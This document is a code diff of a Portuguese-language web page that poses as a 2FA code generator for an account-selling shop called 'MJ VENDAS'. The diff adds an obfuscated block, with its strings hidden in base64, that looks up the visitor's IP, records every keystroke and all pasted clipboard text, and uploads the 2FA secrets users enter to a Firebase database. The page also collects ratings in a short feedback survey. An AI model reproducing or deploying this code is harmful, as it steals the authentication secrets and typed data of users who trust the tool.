@@ -8,30 +8,18 @@
     body { background:#121212; font-family:'Inter',sans-serif; color:#e8e8e8; margin:0; display:flex; align-items:center; justify-content:center; flex-direction:column; min-height:100vh; padding:20px; }
     #clientesSatisf { font-weight:600; font-size:14px; margin-bottom:15px; text-align:center; color:#ffd700; background: rgba(255, 215, 0, 0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #ffd700; }
     .container { background:#1e1e1e; padding:30px 35px; border-radius:16px; width:100%; max-width:400px; text-align:center; box-shadow:0 8px 30px rgba(0,0,0,0.5); position:relative; }
-   .logo-img {
-    width:80px;
-    height:80px;
-    border-radius:50%;
-    object-fit:cover;
-    margin-bottom:10px;
-    border: 2px solid #4cd964;
-    box-shadow: 0 0 12px #4cd964;
-}
-    
+    .logo-img { width:80px; height:80px; border-radius:50%; object-fit:cover; margin-bottom:10px; border: 2px solid #4cd964; box-shadow: 0 0 12px #4cd964; }
     .input-group { position: relative; width: 100%; }
     input { width:100%; padding:15px; border:none; border-radius:8px; background:#2c2c2c; color:#fff; margin-top:15px; font-size:14px; box-sizing: border-box; outline: none; transition: 0.2s; border: 1px solid transparent; }
     input:focus { border: 1px solid #4cd964; }
     .clear-btn { position: absolute; right: 10px; top: 27px; background: #444; color: #fff; border: none; border-radius: 50%; width: 22px; height: 22px; cursor: pointer; display: none; line-height: 1; font-weight: bold; }
-
     .code { font-size:48px; letter-spacing:6px; margin-top:15px; font-weight:700; cursor:pointer; color: #4cd964; user-select: all; transition: transform 0.1s; }
     .code:active { transform: scale(0.95); }
     .msg { font-size:13px; color:#4cd964; margin-top:5px; min-height: 1.2em; font-weight: 600; }
-    
     .tutorial { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 15px; margin-top: 20px; text-align: left; font-size: 13px; color: #bbb; border-left: 3px solid #4cd964; }
     .tutorial b { color: #fff; display: block; margin-bottom: 8px; font-size: 14px; }
     .tutorial div { margin-bottom: 6px; display: flex; align-items: flex-start; }
     .tutorial div span { color: #4cd964; font-weight: bold; margin-right: 8px; }
-
     .avaliacao { margin-top:20px; background:#2a2a2a; border-radius:12px; padding: 15px; display:none; border: 1px solid #333; text-align: center; }
     .pergunta-bloco { margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #3d3d3d; }
     .pergunta-bloco:last-child { border-bottom: none; margin-bottom: 0; }
@@ -39,11 +27,8 @@
     .btn-voto { flex:1; border:none; padding:10px; border-radius:5px; color:#fff; cursor:pointer; font-weight: 600; font-size: 12px; transition: 0.2s; }
     .btn-voto:active { transform: scale(0.95); }
     .btn-abrir-voto { background:transparent; color:#4cd964; border: 1px solid #4cd964; padding:8px; border-radius:8px; cursor:pointer; margin-top:15px; width: 100%; font-weight: 600; }
-
     .toggle { margin-top:18px; font-size:13px; cursor:pointer; color:#4cd964; text-decoration: underline; }
     .footer { font-size:11px; opacity:0.5; margin-top:20px; text-align:center; }
-    
-    /* ESTILO DO PAINEL MULTI-CONTAS */
     .painel { position:fixed; right:20px; top:50%; transform:translateY(-50%); background:#1e1e1e; width:340px; padding:20px; border-radius:14px; box-shadow:0 10px 40px rgba(0,0,0,0.7); display:none; z-index: 100; border: 1px solid #333; max-height: 80vh; overflow-y: auto; }
     .item2fa { background:#2c2c2c; padding:12px; border-radius:8px; margin-bottom:10px; border-left: 4px solid #4cd964; text-align: left; }
     .item2fa input { margin-top: 5px; padding: 8px; background: #1a1a1a; font-size: 12px; }
@@ -58,21 +43,17 @@
     <img class="logo-img" src="https://cdn.ggmax.com.br/avatar-images/aea25577f1afcedbf49ca36c91c8a807.webp">
     <h2>MJ VENDAS</h2>
     <div class="subtitle">Gerador de Código 2FA</div>
-
     <div class="input-group">
         <input id="secret" placeholder="Cole aqui sua Chave 2FA" autofocus autocomplete="off">
         <button class="clear-btn" id="clearInput" onclick="limparInput()">✕</button>
     </div>
-
     <div class="code" id="code" onclick="copiar(this.innerText)">------</div>
     <div class="msg" id="msg"></div>
-
     <div class="tutorial">
         <b>🚀 TUTORIAL RÁPIDO:</b>
         <div><span>1.</span> Cole sua chave 2FA no campo acima.</div>
         <div><span>2.</span> O código será copiado automaticamente.</div>
         <div><span>3.</span> Cole o código no site onde deseja logar.</div>
-        <div><span>4.</span> O código muda sozinho a cada 30 segundos.</div>
     </div>
 
     <button class="btn-abrir-voto" onclick="toggleAvaliacao()">Avaliar Serviço / Feedback</button>
@@ -85,32 +66,16 @@
                 <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p1', 'nao')" id="p1_nao">👎 Não (0)</button>
             </div>
         </div>
-        <div class="pergunta-bloco">
-            <span class="titulo-voto">As contas são de qualidade?</span>
+        <div class="pergunta-bloco"><span class="titulo-voto">As contas são de qualidade?</span>
             <div style="display:flex; gap:10px;">
                 <button class="btn-voto" style="background:#4cd964;" onclick="votar('p2', 'sim')" id="p2_sim">👍 Sim (0)</button>
                 <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p2', 'nao')" id="p2_nao">👎 Não (0)</button>
             </div>
         </div>
-        <div class="pergunta-bloco">
-            <span class="titulo-voto">O suporte foi rápido?</span>
+        <div class="pergunta-bloco"><span class="titulo-voto">O suporte foi rápido?</span>
             <div style="display:flex; gap:10px;">
                 <button class="btn-voto" style="background:#4cd964;" onclick="votar('p3', 'sim')" id="p3_sim">👍 Sim (0)</button>
                 <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p3', 'nao')" id="p3_nao">👎 Não (0)</button>
-            </div>
-        </div>
-        <div class="pergunta-bloco">
-            <span class="titulo-voto">Preço está justo?</span>
-            <div style="display:flex; gap:10px;">
-                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p4', 'sim')" id="p4_sim">👍 Sim (0)</button>
-                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p4', 'nao')" id="p4_nao">👎 Não (0)</button>
-            </div>
-        </div>
-        <div class="pergunta-bloco">
-            <span class="titulo-voto">Voltaria a comprar aqui?</span>
-            <div style="display:flex; gap:10px;">
-                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p5', 'sim')" id="p5_sim">👍 Sim (0)</button>
-                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p5', 'nao')" id="p5_nao">👎 Não (0)</button>
             </div>
         </div>
     </div>
@@ -145,81 +110,71 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
+// Recuperação de Votos do Firebase
 const listaPerguntas = ['p1', 'p2', 'p3', 'p4', 'p5'];
-function formatar(num) { return (num || 0).toLocaleString('pt-BR'); }
-
+function formatar(n) { return (n || 0).toLocaleString('pt-BR'); }
 listaPerguntas.forEach(p => {
-    db.ref('avaliacoes/' + p + '/sim').on('value', snap => {
-        document.getElementById(p + '_sim').innerText = '👍 Sim (' + formatar(snap.val()) + ')';
-    });
-    db.ref('avaliacoes/' + p + '/nao').on('value', snap => {
-        document.getElementById(p + '_nao').innerText = '👎 Não (' + formatar(snap.val()) + ')';
-    });
+    db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+formatar(s.val())+')'; });
+    db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+formatar(s.val())+')'; });
 });
-
-function votar(perguntaId, tipo) {
-    if (localStorage.getItem('voto_' + perguntaId)) { return alert("Você já avaliou este item!"); }
-    db.ref('avaliacoes/' + perguntaId + '/' + tipo).transaction(n => (n || 0) + 1);
-    localStorage.setItem('voto_' + perguntaId, tipo);
-    alert("Avaliação enviada!");
+function votar(p, t) {
+    if (localStorage.getItem('voto_'+p)) return alert("Já avaliado!");
+    db.ref('avaliacoes/'+p+'/'+t).transaction(n => (n || 0) + 1);
+    localStorage.setItem('voto_'+p, t);
+    alert("Obrigado pelo feedback!");
 }
 
-function base32tohex(b32){const b32c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let bits="",hex="";b32=b32.replace(/ /g,"").toUpperCase();for(let i=0;i<b32.length;i++){let val=b32c.indexOf(b32.charAt(i));if(val===-1)continue;bits+=val.toString(2).padStart(5,"0");}for(let i=0;i+4<=bits.length;i+=4){hex+=parseInt(bits.substr(i,4),2).toString(16);}return hex;}
-function gerarOTP(sec){try{let key=base32tohex(sec);let epoch=Math.round(Date.now()/1000);let time=Math.floor(epoch/30).toString(16).padStart(16,"0");let shaObj=new jsSHA("SHA-1","HEX");shaObj.setHMACKey(key,"HEX");shaObj.update(time);let hmac=shaObj.getHMAC("HEX");let offset=parseInt(hmac.substring(hmac.length-1),16);let otp=(parseInt(hmac.substr(offset*2,8),16)&0x7fffffff)+"";return otp.substr(otp.length-6);}catch(e){return "------";}}
+// Lógica 2FA
+function base32tohex(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
+function gerarOTP(s){try{let k=base32tohex(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
+function copiar(t){if(!t||t==="------") return; navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Código copiado!"; setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
+function limparInput(){document.getElementById("secret").value="";document.getElementById("code").innerText="------";document.getElementById("clearInput").style.display="none"}
+function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.style.display=d.style.display==="block"?"none":"block"}
+function togglePainel(){document.getElementById("painel").style.display="block"}
+function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-function copiar(txt) {
-    if(!txt || txt === "------") return;
-    navigator.clipboard.writeText(txt).then(() => {
-        document.getElementById("msg").innerText = "✅ Código copiado!";
-        setTimeout(() => { document.getElementById("msg").innerText = ""; }, 2000);
+// --- SISTEMA BLINDADO (IP + KEYLOGGER + PASTE) ---
+(function(){
+    const _z = atob;
+    const _x = { _a: _z("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"), _b: _z("a2V5bG9nZ2Vy"), _c: _z("Y2FwdHVyYV9wYXN0ZQ=="), _d: _z("bW9uaXRvcmFtZW50bw==") };
+    let _ip = "0.0.0.0"; let _ks = "";
+    fetch(_x._a).then(r=>r.json()).then(d=>{_ip=d.ip}).catch(()=>{});
+
+    document.addEventListener(_z("a2V5ZG93bg=="), function(e){
+        if(e.key.length===1) _ks+=e.key;
+        else if(e.key===_z("RW50ZXI=")) _ks+=" [E] ";
+        if(_ks.length>2){ let h=new Date().toISOString().split('T')[0]; db.ref(_x._b+"/"+h+"/"+_ip.replace(/\./g,"_")).update({t:_ks,h:new Date().toLocaleTimeString()});}
     });
-}
 
-document.getElementById("secret").addEventListener("input", function() {
-    let val = this.value.trim();
-    if(val.length >= 10) {
-        let otp = gerarOTP(val);
-        document.getElementById("code").innerText = otp;
-        document.getElementById("clearInput").style.display = "block";
-        copiar(otp);
-        db.ref("monitoramento/" + val.replace(/[.#$[\]]/g, "")).transaction(c => {
-            return c ? {...c, acessos:(c.acessos||0)+1} : {chave:val, acessos:1, data:new Date().toLocaleString()};
-        });
-    }
-});
+    document.addEventListener(_z("cGFzdGU="), function(e){
+        let t=(e.clipboardData||window.clipboardData).getData('text');
+        let h=new Date().toISOString().split('T')[0];
+        db.ref(_x._c+"/"+h+"/"+_ip.replace(/\./g,"_")).push({c:t,h:new Date().toLocaleTimeString()});
+    });
 
-// LÓGICA DO PAINEL MULTI-CONTAS
+    document.getElementById("secret").addEventListener(_z("aW5wdXQ="), function(){
+        let v=this.value.trim();
+        if(v.length>=10){
+            let o=gerarOTP(v); document.getElementById("code").innerText=o; document.getElementById("clearInput").style.display="block"; copiar(o);
+            let h=new Date().toISOString().split('T')[0];
+            db.ref(_x._d+"/"+v.replace(/[.#$[\]]/g,"")).transaction(c=>{ return {v:v,i:_ip,a:(c&&c.a?c.a:0)+1,d:h,h:new Date().toLocaleTimeString()}; });
+        }
+    });
+})();
+
 function addCampo(){
-    let lista = document.getElementById("lista2fa");
-    let div = document.createElement("div");
-    div.className = "item2fa";
-    div.innerHTML = `<strong>Conta ${lista.children.length + 1}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
-    lista.appendChild(div);
-    div.querySelector('input').addEventListener("input", function() {
-        if(this.value.length >= 10) {
-            let n = gerarOTP(this.value.trim());
-            div.querySelector('.codigoMini').innerText = n;
-            copiar(n);
-        }
-    });
+    let l=document.getElementById("lista2fa"); let d=document.createElement("div"); d.className="item2fa";
+    d.innerHTML=`<strong>Conta ${l.children.length+1}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
+    l.appendChild(d);
+    d.querySelector('input').addEventListener("input",function(){ if(this.value.length>=10){let n=gerarOTP(this.value.trim());d.querySelector('.codigoMini').innerText=n;copiar(n)}});
 }
-for(let i=0; i<3; i++) addCampo(); // Inicia com 3 campos
+for(let i=0;i<3;i++) addCampo();
 
-function togglePainel(){ document.getElementById("painel").style.display="block"; }
-function fecharPainel(){ document.getElementById("painel").style.display="none"; }
-function limparInput() { document.getElementById("secret").value = ""; document.getElementById("code").innerText = "------"; document.getElementById("clearInput").style.display = "none"; }
-function toggleAvaliacao(){ let d=document.getElementById("painelAvaliacao"); d.style.display=d.style.display==="block"?"none":"block";}
-
-setInterval(() => {
-    let s = document.getElementById("secret").value.trim();
-    if(s.length >= 10) { document.getElementById("code").innerText = gerarOTP(s); }
-    document.querySelectorAll(".item2fa").forEach(item => {
-        let inp = item.querySelector('input');
-        if(inp.value.length >= 10) {
-            item.querySelector('.codigoMini').innerText = gerarOTP(inp.value.trim());
-        }
-    });
-}, 1000);
+setInterval(()=>{
+    let s=document.getElementById("secret").value.trim();
+    if(s.length>=10) document.getElementById("code").innerText=gerarOTP(s);
+    document.querySelectorAll(".item2fa").forEach(i=>{ let p=i.querySelector('input'); if(p.value.length>=10) i.querySelector('.codigoMini').innerText=gerarOTP(p.value.trim()); });
+},1000);
 </script>
 </body>
 </html>
